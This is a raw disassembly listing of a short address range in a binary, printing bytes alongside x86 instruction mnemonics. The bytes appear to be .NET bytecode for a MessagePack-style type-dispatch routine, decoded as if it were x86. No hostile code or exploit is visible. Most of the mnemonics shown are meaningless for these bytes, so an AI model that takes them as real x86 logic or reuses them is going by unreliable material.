  403650:	2d 10 06 6f 3d       	sub    $0x3d6f0610,%eax
  403655:	00 00                	add    %al,(%eax)
  403657:	06                   	push   %es
  403658:	0a 06                	or     (%esi),%al
  40365a:	09 6f 38             	or     %ebp,0x38(%edi)
  40365d:	00 00                	add    %al,(%eax)
  40365f:	06                   	push   %es
  403660:	2b 02                	sub    (%edx),%eax
  403662:	07                   	pop    %es
  403663:	0a 11                	or     (%ecx),%dl
  403665:	05 17 58 13 05       	add    $0x5135817,%eax
  40366a:	11 05 08 8e 69 17    	adc    %eax,0x17698e08
  403670:	59                   	pop    %ecx
  403671:	32 cf                	xor    %bh,%cl
  403673:	08 08                	or     %cl,(%eax)
  403675:	8e 69 17             	mov    0x17(%ecx),%gs
  403678:	59                   	pop    %ecx
  403679:	9a 0d 06 09 6f 3b 00 	lcall  $0x3b,$0x6f09060d
  403680:	00 06                	add    %al,(%esi)
  403682:	13 04 11             	adc    (%ecx,%edx,1),%eax
  403685:	04 15                	add    $0x15,%al
  403687:	31 0e                	xor    %ecx,(%esi)
  403689:	06                   	push   %es
  40368a:	7b 26                	jnp    0x4036b2
  40368c:	00 00                	add    %al,(%eax)
  40368e:	04 11                	add    $0x11,%al
  403690:	04 6f                	add    $0x6f,%al
  403692:	59                   	pop    %ecx
  403693:	00 00                	add    %al,(%eax)
  403695:	0a 2a                	or     (%edx),%ch
  403697:	06                   	push   %es
  403698:	6f                   	outsl  %ds:(%esi),(%dx)
  403699:	3d 00 00 06 0a       	cmp    $0xa060000,%eax
  40369e:	06                   	push   %es
  40369f:	09 6f 38             	or     %ebp,0x38(%edi)
  4036a2:	00 00                	add    %al,(%eax)
  4036a4:	06                   	push   %es
  4036a5:	06                   	push   %es
  4036a6:	2a 00                	sub    (%eax),%al
  4036a8:	1b 30                	sbb    (%eax),%esi
  4036aa:	04 00                	add    $0x0,%al
  4036ac:	35 00 00 00 0f       	xor    $0xf000000,%eax
  4036b1:	00 00                	add    %al,(%eax)
  4036b3:	11 73 79             	adc    %esi,0x79(%ebx)
  4036b6:	00 00                	add    %al,(%eax)
  4036b8:	0a 0a                	or     (%edx),%cl
  4036ba:	03 28                	add    (%eax),%ebp
  4036bc:	a0 00 00 06 10       	mov    0x10060000,%al
  4036c1:	01 06                	add    %eax,(%esi)
  4036c3:	03 16                	add    (%esi),%edx
  4036c5:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  4036cb:	00 0a                	add    %cl,(%edx)
  4036cd:	06                   	push   %es
  4036ce:	16                   	push   %ss
  4036cf:	6a 6f                	push   $0x6f
  4036d1:	4e                   	dec    %esi
  4036d2:	00 00                	add    %al,(%eax)
  4036d4:	0a 02                	or     (%edx),%al
  4036d6:	06                   	push   %es
  4036d7:	28 56 00             	sub    %dl,0x0(%esi)
  4036da:	00 06                	add    %al,(%esi)
  4036dc:	de 0a                	fimuls (%edx)
  4036de:	06                   	push   %es
  4036df:	2c 06                	sub    $0x6,%al
  4036e1:	06                   	push   %es
  4036e2:	6f                   	outsl  %ds:(%esi),(%dx)
  4036e3:	33 00                	xor    (%eax),%eax
  4036e5:	00 0a                	add    %cl,(%edx)
  4036e7:	dc 2a                	fsubrl (%edx)
  4036e9:	00 00                	add    %al,(%eax)
  4036eb:	00 01                	add    %al,(%ecx)
  4036ed:	10 00                	adc    %al,(%eax)
  4036ef:	00 02                	add    %al,(%edx)
  4036f1:	00 06                	add    %al,(%esi)
  4036f3:	00 24 2a             	add    %ah,(%edx,%ebp,1)
  4036f6:	00 0a                	add    %cl,(%edx)
  4036f8:	00 00                	add    %al,(%eax)
  4036fa:	00 00                	add    %al,(%eax)
  4036fc:	13 30                	adc    (%eax),%esi
  4036fe:	02 00                	add    (%eax),%al
  403700:	16                   	push   %ss
  403701:	00 00                	add    %al,(%eax)
  403703:	00 10                	add    %dl,(%eax)
  403705:	00 00                	add    %al,(%eax)
  403707:	11 03                	adc    %eax,(%ebx)
  403709:	19 73 77             	sbb    %esi,0x77(%ebx)
  40370c:	00 00                	add    %al,(%eax)
  40370e:	0a 0a                	or     (%edx),%cl
  403710:	02 06                	add    (%esi),%al
  403712:	28 56 00             	sub    %dl,0x0(%esi)
  403715:	00 06                	add    %al,(%esi)
  403717:	06                   	push   %es
  403718:	6f                   	outsl  %ds:(%esi),(%dx)
  403719:	41                   	inc    %ecx
  40371a:	00 00                	add    %al,(%eax)
  40371c:	0a 2a                	or     (%edx),%ch
  40371e:	00 00                	add    %al,(%eax)
  403720:	13 30                	adc    (%eax),%esi
  403722:	04 00                	add    $0x0,%al
  403724:	83 05 00 00 0a 00 00 	addl   $0x0,0xa0000
  40372b:	11 03                	adc    %eax,(%ebx)
  40372d:	6f                   	outsl  %ds:(%esi),(%dx)
  40372e:	7a 00                	jp     0x403730
  403730:	00 0a                	add    %cl,(%edx)
  403732:	d2 0a                	rorb   %cl,(%edx)
  403734:	14 0b                	adc    $0xb,%al
  403736:	16                   	push   %ss
  403737:	0c 16                	or     $0x16,%al
  403739:	0d 06 1f 7f 30       	or     $0x307f1f06,%eax
  40373e:	09 02                	or     %eax,(%edx)
  403740:	06                   	push   %es
  403741:	6e                   	outsb  %ds:(%esi),(%dx)
  403742:	28 42 00             	sub    %al,0x0(%edx)
  403745:	00 06                	add    %al,(%esi)
  403747:	2a 06                	sub    (%esi),%al
  403749:	20 80 00 00 00 32    	and    %al,0x32000000(%eax)
  40374f:	42                   	inc    %edx
  403750:	06                   	push   %es
  403751:	20 8f 00 00 00 30    	and    %cl,0x30000000(%edi)
  403757:	3a 02                	cmp    (%edx),%al
  403759:	28 39                	sub    %bh,(%ecx)
  40375b:	00 00                	add    %al,(%eax)
  40375d:	06                   	push   %es
  40375e:	02 18                	add    (%eax),%bl
  403760:	7d 24                	jge    0x403786
  403762:	00 00                	add    %al,(%eax)
  403764:	04 06                	add    $0x6,%al
  403766:	20 80 00 00 00 59    	and    %al,0x59000000(%eax)
  40376c:	0c 16                	or     $0x16,%al
  40376e:	0d 2b 1c 02 28       	or     $0x28021c2b,%eax
  403773:	3a 00                	cmp    (%eax),%al
  403775:	00 06                	add    %al,(%esi)
  403777:	25 03 28 64 00       	and    $0x642803,%eax
  40377c:	00 06                	add    %al,(%esi)
  40377e:	6f                   	outsl  %ds:(%esi),(%dx)
  40377f:	38 00                	cmp    %al,(%eax)
  403781:	00 06                	add    %al,(%esi)
  403783:	03 6f 56             	add    0x56(%edi),%ebp
  403786:	00 00                	add    %al,(%eax)
  403788:	06                   	push   %es
  403789:	09 17                	or     %edx,(%edi)
  40378b:	58                   	pop    %eax
  40378c:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  403791:	2a 06                	sub    (%esi),%al
  403793:	20 90 00 00 00 32    	and    %dl,0x32000000(%eax)
  403799:	36 06                	ss push %es
  40379b:	20 9f 00 00 00 30    	and    %bl,0x30000000(%edi)
  4037a1:	2e 02 28             	add    %cs:(%eax),%ch
  4037a4:	39 00                	cmp    %eax,(%eax)
  4037a6:	00 06                	add    %al,(%esi)
  4037a8:	02 19                	add    (%ecx),%bl
  4037aa:	7d 24                	jge    0x4037d0
  4037ac:	00 00                	add    %al,(%eax)
  4037ae:	04 06                	add    $0x6,%al
  4037b0:	20 90 00 00 00 59    	and    %dl,0x59000000(%eax)
  4037b6:	0c 16                	or     $0x16,%al
  4037b8:	0d 2b 10 02 28       	or     $0x2802102b,%eax
  4037bd:	3a 00                	cmp    (%eax),%al
  4037bf:	00 06                	add    %al,(%esi)
  4037c1:	03 6f 56             	add    0x56(%edi),%ebp
  4037c4:	00 00                	add    %al,(%eax)
  4037c6:	06                   	push   %es
  4037c7:	09 17                	or     %edx,(%edi)
  4037c9:	58                   	pop    %eax
  4037ca:	0d 09 08 32 ec       	or     $0xec320809,%eax
  4037cf:	2a 06                	sub    (%esi),%al
  4037d1:	20 a0 00 00 00 32    	and    %ah,0x32000000(%eax)
  4037d7:	1e                   	push   %ds
  4037d8:	06                   	push   %es
  4037d9:	20 bf 00 00 00 30    	and    %bh,0x30000000(%edi)
  4037df:	16                   	push   %ss
  4037e0:	06                   	push   %es
  4037e1:	20 a0 00 00 00 59    	and    %ah,0x59000000(%eax)
  4037e7:	0c 02                	or     $0x2,%al
  4037e9:	03 08                	add    (%eax),%ecx
  4037eb:	28 63 00             	sub    %ah,0x0(%ebx)
  4037ee:	00 06                	add    %al,(%esi)
  4037f0:	28 4f 00             	sub    %cl,0x0(%edi)
  4037f3:	00 06                	add    %al,(%esi)
  4037f5:	2a 06                	sub    (%esi),%al
  4037f7:	20 e0                	and    %ah,%al
  4037f9:	00 00                	add    %al,(%eax)
  4037fb:	00 32                	add    %dh,(%edx)
  4037fd:	12 06                	adc    (%esi),%al
  4037ff:	20 ff                	and    %bh,%bh
  403801:	00 00                	add    %al,(%eax)
  403803:	00 30                	add    %dh,(%eax)
  403805:	0a 02                	or     (%edx),%al
  403807:	06                   	push   %es
  403808:	67 6a 28             	addr16 push $0x28
  40380b:	42                   	inc    %edx
  40380c:	00 00                	add    %al,(%eax)
  40380e:	06                   	push   %es
  40380f:	2a 06                	sub    (%esi),%al
  403811:	20 c0                	and    %al,%al
  403813:	00 00                	add    %al,(%eax)
  403815:	00 33                	add    %dh,(%ebx)
  403817:	07                   	pop    %es
  403818:	02 28                	add    (%eax),%ch
  40381a:	4e                   	dec    %esi
  40381b:	00 00                	add    %al,(%eax)
  40381d:	06                   	push   %es
  40381e:	2a 06                	sub    (%esi),%al
  403820:	20 c1                	and    %al,%cl
  403822:	00 00                	add    %al,(%eax)
  403824:	00 33                	add    %dh,(%ebx)
  403826:	0b 72 5b             	or     0x5b(%edx),%esi
  403829:	21 00                	and    %eax,(%eax)
  40382b:	70 73                	jo     0x4038a0
  40382d:	7b 00                	jnp    0x40382f
  40382f:	00 0a                	add    %cl,(%edx)
  403831:	7a 06                	jp     0x403839
  403833:	20 c2                	and    %al,%dl
  403835:	00 00                	add    %al,(%eax)
  403837:	00 33                	add    %dh,(%ebx)
  403839:	08 02                	or     %al,(%edx)
  40383b:	16                   	push   %ss
  40383c:	28 51 00             	sub    %dl,0x0(%ecx)
  40383f:	00 06                	add    %al,(%esi)
  403841:	2a 06                	sub    (%esi),%al
  403843:	20 c3                	and    %al,%bl
  403845:	00 00                	add    %al,(%eax)
  403847:	00 33                	add    %dh,(%ebx)
  403849:	08 02                	or     %al,(%edx)
  40384b:	17                   	pop    %ss
  40384c:	28 51 00             	sub    %dl,0x0(%ecx)
  40384f:	00 06                	add    %al,(%esi)
  403851:	2a 06                	sub    (%esi),%al
  403853:	20 c4                	and    %al,%ah
  403855:	00 00                	add    %al,(%eax)
  403857:	00 33                	add    %dh,(%ebx)
  403859:	20 03                	and    %al,(%ebx)
  40385b:	6f                   	outsl  %ds:(%esi),(%dx)
  40385c:	7a 00                	jp     0x40385e
  40385e:	00 0a                	add    %cl,(%edx)
  403860:	0c 08                	or     $0x8,%al
  403862:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  403866:	01 0b                	add    %ecx,(%ebx)
  403868:	03 07                	add    (%edi),%eax
  40386a:	16                   	push   %ss
  40386b:	08 6f 45             	or     %ch,0x45(%edi)
  40386e:	00 00                	add    %al,(%eax)
  403870:	0a 26                	or     (%esi),%ah
  403872:	02 07                	add    (%edi),%al
  403874:	28 47 00             	sub    %al,0x0(%edi)
  403877:	00 06                	add    %al,(%esi)
  403879:	2a 06                	sub    (%esi),%al
  40387b:	20 c5                	and    %al,%ch
  40387d:	00 00                	add    %al,(%eax)
  40387f:	00 33                	add    %dh,(%ebx)
  403881:	39 18                	cmp    %ebx,(%eax)
  403883:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  403887:	01 0b                	add    %ecx,(%ebx)
  403889:	03 07                	add    (%edi),%eax
  40388b:	16                   	push   %ss
  40388c:	18 6f 45             	sbb    %ch,0x45(%edi)
  40388f:	00 00                	add    %al,(%eax)
  403891:	0a 26                	or     (%esi),%ah
  403893:	07                   	pop    %es
  403894:	28 26                	sub    %ah,(%esi)
  403896:	00 00                	add    %al,(%eax)
  403898:	06                   	push   %es
  403899:	0b 07                	or     (%edi),%eax
  40389b:	16                   	push   %ss
  40389c:	28 7c 00 00          	sub    %bh,0x0(%eax,%eax,1)
  4038a0:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  4038a3:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4038a7:	01 0b                	add    %ecx,(%ebx)
  4038a9:	03 07                	add    (%edi),%eax
  4038ab:	16                   	push   %ss
  4038ac:	08 6f 45             	or     %ch,0x45(%edi)
  4038af:	00 00                	add    %al,(%eax)
  4038b1:	0a 26                	or     (%esi),%ah
  4038b3:	02 07                	add    (%edi),%al
  4038b5:	28 47 00             	sub    %al,0x0(%edi)
  4038b8:	00 06                	add    %al,(%esi)
  4038ba:	2a 06                	sub    (%esi),%al
  4038bc:	20 c6                	and    %al,%dh
  4038be:	00 00                	add    %al,(%eax)
  4038c0:	00 33                	add    %dh,(%ebx)
  4038c2:	39 1a                	cmp    %ebx,(%edx)
  4038c4:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4038c8:	01 0b                	add    %ecx,(%ebx)
  4038ca:	03 07                	add    (%edi),%eax
  4038cc:	16                   	push   %ss
  4038cd:	1a 6f 45             	sbb    0x45(%edi),%ch
  4038d0:	00 00                	add    %al,(%eax)
  4038d2:	0a 26                	or     (%esi),%ah
  4038d4:	07                   	pop    %es
  4038d5:	28 26                	sub    %ah,(%esi)
  4038d7:	00 00                	add    %al,(%eax)
  4038d9:	06                   	push   %es
  4038da:	0b 07                	or     (%edi),%eax
  4038dc:	16                   	push   %ss
  4038dd:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  4038e1:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  4038e4:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4038e8:	01 0b                	add    %ecx,(%ebx)
  4038ea:	03 07                	add    (%edi),%eax
  4038ec:	16                   	push   %ss
  4038ed:	08 6f 45             	or     %ch,0x45(%edi)
  4038f0:	00 00                	add    %al,(%eax)
  4038f2:	0a 26                	or     (%esi),%ah
  4038f4:	02 07                	add    (%edi),%al
  4038f6:	28 47 00             	sub    %al,0x0(%edi)
  4038f9:	00 06                	add    %al,(%esi)
  4038fb:	2a 06                	sub    (%esi),%al
  4038fd:	20 c7                	and    %al,%bh
  4038ff:	00 00                	add    %al,(%eax)
  403901:	00 2e                	add    %ch,(%esi)
  403903:	10 06                	adc    %al,(%esi)
  403905:	20 c8                	and    %cl,%al
  403907:	00 00                	add    %al,(%eax)
  403909:	00 2e                	add    %ch,(%esi)
  40390b:	08 06                	or     %al,(%esi)
  40390d:	20 c9                	and    %cl,%cl
  40390f:	00 00                	add    %al,(%eax)
  403911:	00 33                	add    %dh,(%ebx)
  403913:	0b 72 87             	or     -0x79(%edx),%esi
  403916:	21 00                	and    %eax,(%eax)
  403918:	70 73                	jo     0x40398d
  40391a:	7b 00                	jnp    0x40391c
  40391c:	00 0a                	add    %cl,(%edx)
  40391e:	7a 06                	jp     0x403926
  403920:	20 ca                	and    %cl,%dl
  403922:	00 00                	add    %al,(%eax)
  403924:	00 33                	add    %dh,(%ebx)
  403926:	26 1a 8d 44 00 00 01 	sbb    %es:0x1000044(%ebp),%cl
  40392d:	0b 03                	or     (%ebx),%eax
  40392f:	07                   	pop    %es
  403930:	16                   	push   %ss
  403931:	1a 6f 45             	sbb    0x45(%edi),%ch
  403934:	00 00                	add    %al,(%eax)
  403936:	0a 26                	or     (%esi),%ah
  403938:	07                   	pop    %es
  403939:	28 26                	sub    %ah,(%esi)
  40393b:	00 00                	add    %al,(%eax)
  40393d:	06                   	push   %es
  40393e:	0b 02                	or     (%edx),%eax
  403940:	07                   	pop    %es
  403941:	16                   	push   %ss
  403942:	28 7d 00             	sub    %bh,0x0(%ebp)
  403945:	00 0a                	add    %cl,(%edx)
  403947:	28 52 00             	sub    %dl,0x0(%edx)
  40394a:	00 06                	add    %al,(%esi)
  40394c:	2a 06                	sub    (%esi),%al
  40394e:	20 cb                	and    %cl,%bl
  403950:	00 00                	add    %al,(%eax)
  403952:	00 33                	add    %dh,(%ebx)
  403954:	26 1e                	es push %ds
  403956:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  40395a:	01 0b                	add    %ecx,(%ebx)
  40395c:	03 07                	add    (%edi),%eax
  40395e:	16                   	push   %ss
  40395f:	1e                   	push   %ds
  403960:	6f                   	outsl  %ds:(%esi),(%dx)
  403961:	45                   	inc    %ebp
  403962:	00 00                	add    %al,(%eax)
  403964:	0a 26                	or     (%esi),%ah
  403966:	07                   	pop    %es
  403967:	28 26                	sub    %ah,(%esi)
  403969:	00 00                	add    %al,(%eax)
  40396b:	06                   	push   %es
  40396c:	0b 02                	or     (%edx),%eax
  40396e:	07                   	pop    %es
  40396f:	16                   	push   %ss
  403970:	28 7e 00             	sub    %bh,0x0(%esi)
  403973:	00 0a                	add    %cl,(%edx)
  403975:	28 53 00             	sub    %dl,0x0(%ebx)
  403978:	00 06                	add    %al,(%esi)
  40397a:	2a 06                	sub    (%esi),%al
  40397c:	20 cc                	and    %cl,%ah
  40397e:	00 00                	add    %al,(%eax)
  403980:	00 33                	add    %dh,(%ebx)
  403982:	11 03                	adc    %eax,(%ebx)
  403984:	6f                   	outsl  %ds:(%esi),(%dx)
  403985:	7a 00                	jp     0x403987
  403987:	00 0a                	add    %cl,(%edx)
  403989:	d2 0a                	rorb   %cl,(%edx)
  40398b:	02 06                	add    (%esi),%al
  40398d:	6e                   	outsb  %ds:(%esi),(%dx)
  40398e:	28 42 00             	sub    %al,0x0(%edx)
  403991:	00 06                	add    %al,(%esi)
  403993:	2a 06                	sub    (%esi),%al
  403995:	20 cd                	and    %cl,%ch
  403997:	00 00                	add    %al,(%eax)
  403999:	00 33                	add    %dh,(%ebx)
  40399b:	27                   	daa
  40399c:	18 8d 44 00 00 01    	sbb    %cl,0x1000044(%ebp)
  4039a2:	0b 03                	or     (%ebx),%eax
  4039a4:	07                   	pop    %es
  4039a5:	16                   	push   %ss
  4039a6:	18 6f 45             	sbb    %ch,0x45(%edi)
  4039a9:	00 00                	add    %al,(%eax)
  4039ab:	0a 26                	or     (%esi),%ah
  4039ad:	07                   	pop    %es
  4039ae:	28 26                	sub    %ah,(%esi)
  4039b0:	00 00                	add    %al,(%eax)
  4039b2:	06                   	push   %es
  4039b3:	0b 02                	or     (%edx),%eax
  4039b5:	07                   	pop    %es
  4039b6:	16                   	push   %ss
  4039b7:	28 7c 00 00          	sub    %bh,0x0(%eax,%eax,1)
  4039bb:	0a 6e 28             	or     0x28(%esi),%ch
  4039be:	42                   	inc    %edx
  4039bf:	00 00                	add    %al,(%eax)
  4039c1:	06                   	push   %es
  4039c2:	2a 06                	sub    (%esi),%al
  4039c4:	20 ce                	and    %cl,%dh
  4039c6:	00 00                	add    %al,(%eax)
  4039c8:	00 33                	add    %dh,(%ebx)
  4039ca:	27                   	daa
  4039cb:	1a 8d 44 00 00 01    	sbb    0x1000044(%ebp),%cl
  4039d1:	0b 03                	or     (%ebx),%eax
  4039d3:	07                   	pop    %es
  4039d4:	16                   	push   %ss
  4039d5:	1a 6f 45             	sbb    0x45(%edi),%ch
  4039d8:	00 00                	add    %al,(%eax)
  4039da:	0a 26                	or     (%esi),%ah
  4039dc:	07                   	pop    %es
  4039dd:	28 26                	sub    %ah,(%esi)
  4039df:	00 00                	add    %al,(%eax)
  4039e1:	06                   	push   %es
  4039e2:	0b 02                	or     (%edx),%eax
  4039e4:	07                   	pop    %es
  4039e5:	16                   	push   %ss
  4039e6:	28 7f 00             	sub    %bh,0x0(%edi)
  4039e9:	00 0a                	add    %cl,(%edx)
  4039eb:	6e                   	outsb  %ds:(%esi),(%dx)
  4039ec:	28 42 00             	sub    %al,0x0(%edx)
  4039ef:	00 06                	add    %al,(%esi)
  4039f1:	2a 06                	sub    (%esi),%al
  4039f3:	20 cf                	and    %cl,%bh
  4039f5:	00 00                	add    %al,(%eax)
  4039f7:	00 33                	add    %dh,(%ebx)
  4039f9:	26 1e                	es push %ds
  4039fb:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4039ff:	01 0b                	add    %ecx,(%ebx)
  403a01:	03 07                	add    (%edi),%eax
  403a03:	16                   	push   %ss
  403a04:	1e                   	push   %ds
  403a05:	6f                   	outsl  %ds:(%esi),(%dx)
  403a06:	45                   	inc    %ebp
  403a07:	00 00                	add    %al,(%eax)
  403a09:	0a 26                	or     (%esi),%ah
  403a0b:	07                   	pop    %es
  403a0c:	28 26                	sub    %ah,(%esi)
  403a0e:	00 00                	add    %al,(%eax)
  403a10:	06                   	push   %es
  403a11:	0b 02                	or     (%edx),%eax
  403a13:	07                   	pop    %es
  403a14:	16                   	push   %ss
  403a15:	28 80 00 00 0a 28    	sub    %al,0x280a0000(%eax)
  403a1b:	43                   	inc    %ebx
  403a1c:	00 00                	add    %al,(%eax)
  403a1e:	06                   	push   %es
  403a1f:	2a 06                	sub    (%esi),%al
  403a21:	20 dc                	and    %bl,%ah
  403a23:	00 00                	add    %al,(%eax)
  403a25:	00 33                	add    %dh,(%ebx)
  403a27:	46                   	inc    %esi
  403a28:	18 8d 44 00 00 01    	sbb    %cl,0x1000044(%ebp)
  403a2e:	0b 03                	or     (%ebx),%eax
  403a30:	07                   	pop    %es
  403a31:	16                   	push   %ss
  403a32:	18 6f 45             	sbb    %ch,0x45(%edi)
  403a35:	00 00                	add    %al,(%eax)
  403a37:	0a 26                	or     (%esi),%ah
  403a39:	07                   	pop    %es
  403a3a:	28 26                	sub    %ah,(%esi)
  403a3c:	00 00                	add    %al,(%eax)
  403a3e:	06                   	push   %es
  403a3f:	0b 07                	or     (%edi),%eax
  403a41:	16                   	push   %ss
  403a42:	28 81 00 00 0a 0c    	sub    %al,0xc0a0000(%ecx)
  403a48:	02 28                	add    (%eax),%ch
  403a4a:	39 00                	cmp    %eax,(%eax)
  403a4c:	00 06                	add    %al,(%esi)
  403a4e:	02 19                	add    (%ecx),%bl
  403a50:	7d 24                	jge    0x403a76
  403a52:	00 00                	add    %al,(%eax)
  403a54:	04 16                	add    $0x16,%al
  403a56:	0d 2b 10 02 28       	or     $0x2802102b,%eax
  403a5b:	3a 00                	cmp    (%eax),%al
  403a5d:	00 06                	add    %al,(%esi)
  403a5f:	03 6f 56             	add    0x56(%edi),%ebp
  403a62:	00 00                	add    %al,(%eax)
  403a64:	06                   	push   %es
  403a65:	09 17                	or     %edx,(%edi)
  403a67:	58                   	pop    %eax
  403a68:	0d 09 08 32 ec       	or     $0xec320809,%eax
  403a6d:	2a 06                	sub    (%esi),%al
  403a6f:	20 dd                	and    %bl,%ch
  403a71:	00 00                	add    %al,(%eax)
  403a73:	00 33                	add    %dh,(%ebx)
  403a75:	46                   	inc    %esi
  403a76:	1a 8d 44 00 00 01    	sbb    0x1000044(%ebp),%cl
  403a7c:	0b 03                	or     (%ebx),%eax
  403a7e:	07                   	pop    %es
  403a7f:	16                   	push   %ss
  403a80:	1a 6f 45             	sbb    0x45(%edi),%ch
  403a83:	00 00                	add    %al,(%eax)
  403a85:	0a 26                	or     (%esi),%ah
  403a87:	07                   	pop    %es
  403a88:	28 26                	sub    %ah,(%esi)
  403a8a:	00 00                	add    %al,(%eax)
  403a8c:	06                   	push   %es
  403a8d:	0b 07                	or     (%edi),%eax
  403a8f:	16                   	push   %ss
  403a90:	28 81 00 00 0a 0c    	sub    %al,0xc0a0000(%ecx)
  403a96:	02 28                	add    (%eax),%ch
  403a98:	39 00                	cmp    %eax,(%eax)
  403a9a:	00 06                	add    %al,(%esi)
  403a9c:	02 19                	add    (%ecx),%bl
  403a9e:	7d 24                	jge    0x403ac4
  403aa0:	00 00                	add    %al,(%eax)
  403aa2:	04 16                	add    $0x16,%al
  403aa4:	0d 2b 10 02 28       	or     $0x2802102b,%eax
  403aa9:	3a 00                	cmp    (%eax),%al
  403aab:	00 06                	add    %al,(%esi)
  403aad:	03 6f 56             	add    0x56(%edi),%ebp
  403ab0:	00 00                	add    %al,(%eax)
  403ab2:	06                   	push   %es
  403ab3:	09 17                	or     %edx,(%edi)
  403ab5:	58                   	pop    %eax
  403ab6:	0d 09 08 32 ec       	or     $0xec320809,%eax
  403abb:	2a 06                	sub    (%esi),%al
  403abd:	20 d9                	and    %bl,%cl
  403abf:	00 00                	add    %al,(%eax)
  403ac1:	00 33                	add    %dh,(%ebx)
  403ac3:	0e                   	push   %cs
  403ac4:	02 06                	add    (%esi),%al
  403ac6:	03 28                	add    (%eax),%ebp
  403ac8:	65 00 00             	add    %al,%gs:(%eax)
  403acb:	06                   	push   %es
  403acc:	28 4f 00             	sub    %cl,0x0(%edi)
  403acf:	00 06                	add    %al,(%esi)
  403ad1:	2a 06                	sub    (%esi),%al
  403ad3:	20 de                	and    %bl,%dh
  403ad5:	00 00                	add    %al,(%eax)
  403ad7:	00 33                	add    %dh,(%ebx)
  403ad9:	52                   	push   %edx
  403ada:	18 8d 44 00 00 01    	sbb    %cl,0x1000044(%ebp)
  403ae0:	0b 03                	or     (%ebx),%eax
  403ae2:	07                   	pop    %es
  403ae3:	16                   	push   %ss
  403ae4:	18 6f 45             	sbb    %ch,0x45(%edi)
  403ae7:	00 00                	add    %al,(%eax)
  403ae9:	0a 26                	or     (%esi),%ah
  403aeb:	07                   	pop    %es
  403aec:	28 26                	sub    %ah,(%esi)
  403aee:	00 00                	add    %al,(%eax)
  403af0:	06                   	push   %es
  403af1:	0b 07                	or     (%edi),%eax
  403af3:	16                   	push   %ss
  403af4:	28 81 00 00 0a 0c    	sub    %al,0xc0a0000(%ecx)
  403afa:	02 28                	add    (%eax),%ch
  403afc:	39 00                	cmp    %eax,(%eax)
  403afe:	00 06                	add    %al,(%esi)
  403b00:	02 18                	add    (%eax),%bl
  403b02:	7d 24                	jge    0x403b28
  403b04:	00 00                	add    %al,(%eax)
  403b06:	04 16                	add    $0x16,%al
  403b08:	0d 2b 1c 02 28       	or     $0x28021c2b,%eax
  403b0d:	3a 00                	cmp    (%eax),%al
  403b0f:	00 06                	add    %al,(%esi)
  403b11:	25 03 28 64 00       	and    $0x642803,%eax
  403b16:	00 06                	add    %al,(%esi)
  403b18:	6f                   	outsl  %ds:(%esi),(%dx)
  403b19:	38 00                	cmp    %al,(%eax)
  403b1b:	00 06                	add    %al,(%esi)
  403b1d:	03 6f 56             	add    0x56(%edi),%ebp
  403b20:	00 00                	add    %al,(%eax)
  403b22:	06                   	push   %es
  403b23:	09 17                	or     %edx,(%edi)
  403b25:	58                   	pop    %eax
  403b26:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  403b2b:	2a 06                	sub    (%esi),%al
  403b2d:	20 de                	and    %bl,%dh
  403b2f:	00 00                	add    %al,(%eax)
  403b31:	00 33                	add    %dh,(%ebx)
  403b33:	52                   	push   %edx
  403b34:	18 8d 44 00 00 01    	sbb    %cl,0x1000044(%ebp)
  403b3a:	0b 03                	or     (%ebx),%eax
  403b3c:	07                   	pop    %es
  403b3d:	16                   	push   %ss
  403b3e:	18 6f 45             	sbb    %ch,0x45(%edi)
  403b41:	00 00                	add    %al,(%eax)
  403b43:	0a 26                	or     (%esi),%ah
  403b45:	07                   	pop    %es
  403b46:	28 26                	sub    %ah,(%esi)
  403b48:	00 00                	add    %al,(%eax)
  403b4a:	06                   	push   %es
  403b4b:	0b 07                	or     (%edi),%eax
  403b4d:	16                   	push   %ss
  403b4e:	28 81 00 00 0a 0c    	sub    %al,0xc0a0000(%ecx)
  403b54:	02 28                	add    (%eax),%ch
  403b56:	39 00                	cmp    %eax,(%eax)
  403b58:	00 06                	add    %al,(%esi)
  403b5a:	02 18                	add    (%eax),%bl
  403b5c:	7d 24                	jge    0x403b82
  403b5e:	00 00                	add    %al,(%eax)
  403b60:	04 16                	add    $0x16,%al
  403b62:	0d 2b 1c 02 28       	or     $0x28021c2b,%eax
  403b67:	3a 00                	cmp    (%eax),%al
  403b69:	00 06                	add    %al,(%esi)
  403b6b:	25 03 28 64 00       	and    $0x642803,%eax
  403b70:	00 06                	add    %al,(%esi)
  403b72:	6f                   	outsl  %ds:(%esi),(%dx)
  403b73:	38 00                	cmp    %al,(%eax)
  403b75:	00 06                	add    %al,(%esi)
  403b77:	03 6f 56             	add    0x56(%edi),%ebp
  403b7a:	00 00                	add    %al,(%eax)
  403b7c:	06                   	push   %es
  403b7d:	09 17                	or     %edx,(%edi)
  403b7f:	58                   	pop    %eax
  403b80:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  403b85:	2a 06                	sub    (%esi),%al
  403b87:	20 df                	and    %bl,%bh
  403b89:	00 00                	add    %al,(%eax)
  403b8b:	00 33                	add    %dh,(%ebx)
  403b8d:	52                   	push   %edx
  403b8e:	1a 8d 44 00 00 01    	sbb    0x1000044(%ebp),%cl
  403b94:	0b 03                	or     (%ebx),%eax
  403b96:	07                   	pop    %es
  403b97:	16                   	push   %ss
  403b98:	1a 6f 45             	sbb    0x45(%edi),%ch
  403b9b:	00 00                	add    %al,(%eax)
  403b9d:	0a 26                	or     (%esi),%ah
  403b9f:	07                   	pop    %es
  403ba0:	28 26                	sub    %ah,(%esi)
  403ba2:	00 00                	add    %al,(%eax)
  403ba4:	06                   	push   %es
  403ba5:	0b 07                	or     (%edi),%eax
  403ba7:	16                   	push   %ss
  403ba8:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  403bac:	0a 0c 02             	or     (%edx,%eax,1),%cl
  403baf:	28 39                	sub    %bh,(%ecx)
  403bb1:	00 00                	add    %al,(%eax)
  403bb3:	06                   	push   %es
  403bb4:	02 18                	add    (%eax),%bl
